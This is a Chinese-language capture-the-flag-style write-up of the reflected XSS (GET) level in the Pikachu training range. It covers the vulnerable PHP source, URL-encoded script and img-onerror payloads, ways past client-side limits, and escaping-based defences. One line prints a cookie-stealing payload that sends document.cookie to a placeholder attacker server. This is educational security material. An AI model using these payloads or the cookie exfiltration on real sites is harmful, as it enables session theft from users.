# 反射型 XSS（GET）：没看到弹窗，不等于没打通
> 我在输入框里塞不进 payload（被 `maxlength` 挡住），改地址栏塞进去了，页面却只显示 `who is ,i don't care!`——中间空了一块。我以为失败了，后来才明白：**那块空白，正是脚本执行过的痕迹。**
## 一、环境与目标
| 项目 | 内容 |
| --- | --- |
| 靶场 | Pikachu |
| 运行环境 | phpStudy（Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4 NTS） |
| 站点根目录 | `D:\Pikachu` |
| 访问方式 | `http://pikachu/` |
| 关卡位置 | Cross-Site Scripting → 反射型xss(get) |
| 页面地址 | `http://pikachu/vul/xss/xss_reflected_get.php` |
| 工具 | 浏览器、Burp Suite（可选） |
目标：让页面执行我们自己写的 JavaScript。
XSS 模块的入口是一页概述，左侧就是这一章的学习路径：
![XSS 模块概述](images/04-overview.png)
## 二、这关在考什么
### 2.1 页面
![初始页面](images/01-page.png)
一个输入框，问题是「Which NBA player do you like?」。
### 2.2 源码
`vul/xss/xss_reflected_get.php`：
```php
$html='';
if(isset($_GET['submit'])){
    if(empty($_GET['message'])){
        $html.="<p class='notice'>输入'kobe'试试-_-</p>";
    }else{
        if($_GET['message']=='kobe'){
            $html.="<p class='notice'>愿你和{$_GET['message']}一样，永远年轻，永远热血沸腾！</p><img src='...kobe.png' />";
        }else{
            $html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
        }
    }
}
```
关键在最后一行：
```php
$html.="<p class='notice'>who is {$_GET['message']},i don't care!</p>";
```
**`$_GET['message']` 被直接拼进了 HTML，没有经过任何转义。**
### 2.3 问题在哪
正常情况下，用户输入应该只是"文字"。但这里它被放进了 HTML 的代码区，于是：
- 你输入 `test` → 页面显示 `who is test`
- 你输入 `<script>alert(1)</script>` → 浏览器看到 `<script>`，当成代码执行
**浏览器分不清"用户输入的文字"和"网站的代码"。**
## 三、常规解法
1. 先在输入框输入 `kobe`，确认页面正常功能；
2. 构造 payload，让它出现在 URL 的 `message` 参数里；
3. 观察浏览器是否执行。
因为是 GET 请求，payload 直接拼在地址栏里就能提交，不需要工具。
## 四、我的实操过程
### 4.1 先按提示输入 kobe
页面右上角的提示写着：「管tmd什么xss，首先你应该输入kobe看一下再说」。
输入 `kobe`，页面出现一段特殊文案和一张球员照片。这说明功能是正常的。
### 4.2 输入 test，观察"反射"
输入 `test`，页面显示：
```
who is test,i don't care!
```
我输入的 `test`，原封不动出现在了页面里。这就是"反射"——**你发什么，服务器就把什么弹回来。**
### 4.3 想输入 payload，被挡住了
输入框有这么个限制：
```html
<input class="xssr_in" type="text" maxlength="20" name="message" />
```
`maxlength="20"`，最多 20 个字符。
而 `<script>alert(1)</script>` 有 **25 个字符**，粘进去会被截断。
> 这和上一关的"前端限制"是同一类问题：**`maxlength` 只约束浏览器里的输入框，管不住地址栏。**
### 4.4 改地址栏绕过
把整条 URL 改成：
```
http://pikachu/vul/xss/xss_reflected_get.php?message=%3Cscript%3Ealert(1)%3C/script%3E&submit=submit
```
> `%3C` 是 `<`，`%3E` 是 `>`，URL 编码。服务器收到后自动解码，`maxlength` 完全失效。
### 4.5 结果：页面没有弹窗
![脚本 payload 的结果](images/02-script-result.png)
页面显示：
```
who is ,i don't care!
```
**没有弹出对话框。** 我当时的判断是：payload 没传进去，失败了。
### 4.6 换一个 payload 再试
换成图片标签：
```
http://pikachu/vul/xss/xss_reflected_get.php?message=%3Cimg%20src=x%20onerror=alert(document.domain)%3E&submit=submit
```
![img payload 的结果](images/03-img-result.png)
这次页面上出现了一个**碎图图标**——`who is 🖼 ,i don't care!`
看到"实物"了，我才反应过来：**尖括号不见了，说明标签被解析了，不是失败了。**
## 五、踩坑记录：为什么没弹窗
### 5.1 我当时的判断（错的）
> "页面显示 `who is ,i don't care!`，说明 `message` 是空的，payload 根本没传进去。"
**这个判断是错的。**
### 5.2 真正的判断依据
对比两次的显示：
| 输入 | 页面显示 |
| --- | --- |
| `test` | `who is test,i don't care!` |
| `<script>alert(1)</script>` | `who is ,i don't care!` |
**`who is` 和 `,i don't care!` 之间空的那一块，就是 `<script>` 所在的位置。**
因为 `<script>` 标签本身不产生任何可见文字，所以那一块看起来是空的。
服务器实际返回的 HTML 是：
```html
<p class='notice'>who is <script>alert(1)</script>,i don't care!</p>
```
**如果防御生效，这里应该是：**
```html
<p class='notice'>who is &lt;script&gt;alert(1)&lt;/script&gt;,i don't care!</p>
```
那样浏览器会把 `<script>alert(1)</script>` **当文字显示出来**，你能直接看到尖括号。
### 5.3 那为什么没弹窗
三种可能，都不影响"注入成功"这个结论：
1. **弹了，被我点了确定**——对话框一闪就没了；
2. **浏览器静音了弹窗**——Chrome 在连续关掉几次弹窗后，会提供"阻止此页面创建更多对话框"的选项，勾上之后所有 `alert` 都静默执行；
3. **被扩展或安全软件拦了**。
### 5.4 踩坑表
| 现象 | 我的判断 | 真相 |
| --- | --- | --- |
| 输入框里打不进完整 payload | 页面有问题 | `maxlength="20"`，纯前端限制 |
| 页面显示 `who is ,i don't care!` | payload 没传进去 | 传进去了，只是 `<script>` 不渲染文字 |
| 没有弹窗 | XSS 失败 | 可能已执行，弹窗被静音或已关闭 |
| img payload 出现碎图 | 这次成功了 | 对，碎图才是"可见证据" |
## 六、如何确认 XSS 真的成功
**不要只盯着弹窗。** 弹窗只是最直观的一种表现，不是唯一标准。
### 方法一：看"尖括号有没有消失"
- 页面上能看到 `<img src=x ...>` 这样的**文字** → 被转义了，**失败**
- 尖括号消失，变成一个元素（碎图、红块、跳转） → **成功**
### 方法二：换成有持久可见效果的 payload
```html
<script>document.body.style.background='red'</script>
```
执行后**整个页面变红**，想错过都难。
```html
<script>document.title='XSS'</script>
```
执行后**浏览器标签页的标题会变**。
### 方法三：F12 看 DOM
按 `F12` → `Elements` → `Ctrl+F` 搜 `notice`：
| DOM 里的样子 | 结论 |
| --- | --- |
| `who is <script>alert(1)</script>,` | 注入成功 |
| `who is &lt;script&gt;alert(1)&lt;/script&gt;,` | 被转义，失败 |
### 判定表
| 页面表现 | 结论 |
| --- | --- |
| 显示文字 `<script>...`（带尖括号） | 被转义，失败 |
| 碎图 / 页面变红 / 标题改变 / 弹窗 | **成功，代码被执行了** |
## 七、我学到了什么
### 7.1 通关标准不是"弹窗"
XSS 的本质是「**你写的内容被当成代码执行了**」。弹窗只是证明它的一种方式，换成改背景色、改标题、发请求，本质完全一样。
**只盯着弹窗，会误判成失败。**
### 7.2 前端的限制，全都可以绕
- `maxlength="20"` → 改地址栏
- `type="hidden"` → F12 改 value
- `readonly` → F12 删掉属性
- `onsubmit` 校验 → 直接发包
这和上一关「验证码绕过(on client)」是同一个道理：**浏览器这边的一切，都在攻击者手里。**
### 7.3 反射型的危害在哪
`alert(1)` 只是演示。真实利用是：
```html
<script>new Image().src='http://攻击者服务器/?c='+document.cookie</script>
```
**把受害者的 Cookie 发到攻击者服务器**，攻击者拿到就能冒充登录。
这也是它叫"反射型"的原因：payload 不落地、不存储，靠**骗人点链接**来触发，一次一个。
### 7.4 看响应，比看页面可靠
页面是浏览器**渲染后**的结果，很多信息被"吃掉"了。真正的证据在服务器返回的 HTML 里——按 `F12` 看源码，或者用 Burp 看响应体。
我这次就是因为只看页面，误判了两次。
## 八、防御怎么写才对
```php
// 正确：输出时转义
$msg = htmlspecialchars($_GET['message'], ENT_QUOTES, 'UTF-8');
echo "<p class='notice'>who is {$msg},i don't care!</p>";
```
转义之后，`<` 变成 `&lt;`，浏览器只会把它当文字显示。
三层配合：
| 层 | 做法 |
| --- | --- |
| 输出编码 | `htmlspecialchars()`，按输出位置选择编码方式 |
| Cookie 保护 | `HttpOnly`，让 JS 读不到 Cookie |
| CSP | `Content-Security-Policy`，禁止内联脚本执行 |
注意：**输入过滤只能当辅助**，因为黑名单永远会被绕过——后面 `xss之过滤`、`xss之href输出`、`xss之js输出` 几关就是专门演示这个的。
## 九、下一关
- [x] 反射型xss(get)
- [ ] 反射型xss(post)
- [ ] 存储型xss
- [ ] DOM型xss
- [ ] xss之盲打、过滤、htmlspecialchars、href输出、js输出
`get` 和 `post` 的区别只在于参数从哪来，原理完全一样。真正开始变难的是「存储型」和后面那几个"过滤绕过"。
## 参考
- [Pikachu 源码](https://github.com/zhuifengshaonianhanlu/pikachu)
- [OWASP: Cross Site Scripting](https://owasp.org/www-community/attacks/xss/)
- [MDN: HTML 转义](https://developer.mozilla.org/zh-CN/docs/Glossary/Entity)
- [小皮面板官网](https://www.xp.cn/)
---
**一句话总结**：我盯着弹窗找了半天成功，其实它早就成了——**页面中间那块空白，就是脚本跑过的地方。**
